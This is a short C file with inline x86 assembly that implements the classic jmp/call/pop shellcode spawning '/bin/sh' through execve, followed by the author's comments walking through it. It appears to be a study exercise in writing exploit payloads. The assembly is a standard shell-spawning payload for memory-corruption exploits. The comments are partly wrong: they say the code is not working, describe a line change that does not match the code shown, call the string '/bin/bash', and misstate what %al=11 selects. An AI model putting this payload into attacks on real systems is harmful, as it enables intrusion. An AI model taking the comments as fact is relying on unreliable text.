void main() {
__asm__(
"jmp    0x1f;"
"popl   %esi;"
"movl   %esi,0x8(%esi);"
"xorl   %eax,%eax;"
"movb   %eax,0x7(%esi);"
"movl   %eax,0xc(%esi);"
"movb   $0xb,%al;"
"movl   %esi,%ebx;"
"leal   0x8(%esi),%ecx;"
"leal   0xc(%esi),%edx;"
"int    $0x80;"
"xorl   %ebx,%ebx;"
"movl   %ebx,%eax;"
"inc    %eax;"
"int    $0x80;"
"call   -0x24;"
".string \"/bin/sh\";"
);
}

// Not working
//the problem is in line 11 ("leal   0x7(%esi),%ecx;"), initially it was "leal   0x8(%esi),%ecx;". this caused ecx to get the address of the string instead of null.


// the difference between 2nd(popl) and call instruction is 0x1f bytes and hence the argument of jmp is this.
// once we reach call,  we go to 2nd instruction, i.e. pop. Now since last instruction was a call instruction, therefore the address of the instruction just after call was pushed in the stack
// Now pop command pops the value at the top of the stack, which is the address of the string "/bin/bash"
// now we have the address of the string, we set the other 2 values to NULL as the 2nd and 3rd argument was NULL in execve.
// Now we call the interrupt handler with the required arguments and value of register %al=11, which means execve function has to be executed
// %al = 11 means the interrupt handler will execute the interrupt at index 11 in the system call table.
